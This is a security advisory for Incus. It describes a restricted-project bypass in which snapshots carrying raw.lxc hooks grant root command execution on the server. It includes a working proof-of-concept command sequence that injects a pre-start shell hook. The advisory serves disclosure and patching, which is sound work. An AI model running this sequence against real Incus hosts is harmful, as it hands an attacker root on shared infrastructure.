# [C] Incus has a restricted project bypass leading to arbitrary command execution

## Summary
Severity: Critical
Advisory: GHSA-48q5-w887-33wv
CVE: CVE-2026-48751
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-48q5-w887-33wv
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v7/cmd/incusd` — affected >=0 <7.2.0

## Details
### Summary

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.


### Details

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.

As snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.

In practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.


### PoC

```
# remote, restricted
incus project set rem:project restricted.true
incus project set rem:project restricted.containers.lowlevel=block

# locally, unrestricted project
incus init images:debian/trixie rce-raw-lxc
incus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c "/bin/id >/lxc-hook-prestart"'
incus snapshot create rce-raw-lxc snap0
#> allow transfer to restricted project
incus config unset rce-raw-lxc raw.lxc

# locally, transfer and trigger
incus move rce-raw-lxc rem: --mode push
incus snapshot restore rem:rce-raw-lxc snap0
incus start rem:rce-raw-lxc
```


### Impact

- Bypass of project restrictions.
- Arbitrary command execution on the Incus server.

## References
- https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv
- https://github.com/lxc/incus
